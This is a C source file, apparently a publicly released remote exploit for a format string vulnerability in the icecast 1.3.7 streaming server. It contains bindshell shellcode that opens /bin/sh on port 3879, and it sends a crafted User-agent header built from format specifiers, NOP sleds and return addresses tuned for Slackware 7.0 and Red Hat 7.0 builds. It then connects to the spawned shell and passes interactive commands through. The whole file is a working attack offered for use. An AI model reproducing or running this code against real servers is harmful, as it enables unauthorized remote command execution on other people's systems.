* Exploits format string vulnerability in icecast 1.3.7
 * Coded by |CyRaX| <cyrax@pkcrew.org>
 * Packet Knights Crew http://www.pkcrew.org/
 *
*/




#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <netinet/in.h>

char code[]=
"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";

unsigned long ip;
void try_it();

struct target{
   char *name;
   char *addr1;
   char *addr2;
   char *addr3;
   char *addr4;
   u_short one;
   u_short two;
   u_short three;
   u_short xx;
   u_short pad;

};



int main(int argc,char **argv){
   int s,i,sel;
   struct sockaddr_in sk;
   char sndbuff[9000],xx[9000],one[300],two[300],three[300],nop[1000],pad[100];
   struct target tl[]={
        {
           "icecast-1.3.7.tar.gz compiled on Slackware 7.0",
           "\x1c\xdb\x5f\xbf",
           "\x1d\xdb\x5f\xbf",
           "\x1e\xdb\x5f\xbf",
           "\x1f\xdb\x5f\xbf",
           123,
           136,
           96,
           2076,
           5
        },
        {
           "icecast-1.3.7.tar.gz compiled on Redhat 7.0",
           "\xd8\xd8\x5f\xbf",
           "\xd9\xd8\x5f\xbf",
           "\xda\xd8\x5f\xbf",
           "\xdb\xd8\x5f\xbf",
           116,
           159,
           96,
           2074,
           3
        }
   };

   printf("Icecast 1.3.7 format bug exploit by |CyRaX| <cyrax@pkcrew.org\n");
   printf("Packet Knights Crew | http://www.pkcrew.org/\n");

   if(argc<4){
      printf("Usage : ./PKCicecast-ex <target> <port> <type>\n");
      printf("types are :\n");
      for(i=0;i<(sizeof(tl)/sizeof(struct target));i++){
         printf("%2i : %s\n",i,tl[i].name);
      }
      exit(0);
   }

   sel=atoi(argv[3]);
   memset(sndbuff,0,9000);
   memset(xx,0,9000);
   memset(one,0,300);
   memset(two,0,300);
   memset(three,0,300);
   memset(pad,0,100);
   memset(nop,'\x90',1000);
   nop[1000]=0;

   s=socket(AF_INET,SOCK_STREAM,0);

   ip=inet_addr(argv[1]);
   sk.sin_addr.s_addr=ip;
   sk.sin_port=htons(atoi(argv[2]));
   sk.sin_family=AF_INET;
   connect(s,(struct sockaddr *)&sk,sizeof(sk));
   strcpy(sndbuff,"GET / HTTP/1.0\n");
   send(s,sndbuff,strlen(sndbuff),0);

   for(i=0;i<=(tl[sel].xx*3);i+=3){
      memcpy(xx+i,"%8x",3);
   }
   memset(one,'\x90',tl[sel].one);
   memset(two,'\x90',tl[sel].two);
   memset(three,'\x90',tl[sel].three);
   memcpy(one+strlen(one)-2,"\xeb\x02",2);
   memcpy(two+strlen(two)-2,"\xeb\x02",2);
   memcpy(three+strlen(three)-2,"\xeb\x02",2);
   memset(pad,'X',tl[sel].pad);
   sprintf(sndbuff,"User-agent: %s"
   "%s"
   "%s"
   "%s"
   "%s"
   "%s" /* the %8x */
   "%%n"
   "%s%%n"
   "%s%%n"
   "%s%%n"
   "%s"
   "%s\n\n"
   ,pad,tl[sel].addr1,tl[sel].addr2,tl[sel].addr3,tl[sel].addr4,
           xx,one,two,three,nop,code);
   send(s,sndbuff,strlen(sndbuff),0);
   printf("We must sleep for 120 seconds. Waiting for icecast to do the statistic\n");
   alarm(120);
   signal(SIGALRM,try_it);
   while(1)recv(s,sndbuff,9000,0);
}

void try_it(){
   struct sockaddr_in sk;
   int s;
   char buff[1000];
   fd_set fs;

   printf("trying!\n");
   sk.sin_addr.s_addr=ip;
   sk.sin_port=htons(3879);
   sk.sin_family=AF_INET;
   s=socket(AF_INET,SOCK_STREAM,0);
   if(connect(s,(struct sock_addr*)&sk,sizeof(sk))==-1){
      printf("sorry.. it did'nt worked\n");
      exit(0);
   }
   strcpy(buff,"uname -a;id\n");
   send(s,buff,strlen(buff),0);
   while(1){
      memset(buff,0,1000);
      FD_ZERO(&fs);
      FD_SET(0,&fs);
      FD_SET(s,&fs);
      select(s+1,&fs,NULL,NULL,NULL);
      if(FD_ISSET(0,&fs)){
         fgets(buff,1000,stdin);
         send(s,buff,strlen(buff),0);
      }
      if(FD_ISSET(s,&fs)){
         recv(s,buff,1000,0);
         printf("%s",buff);
      }
   }

}



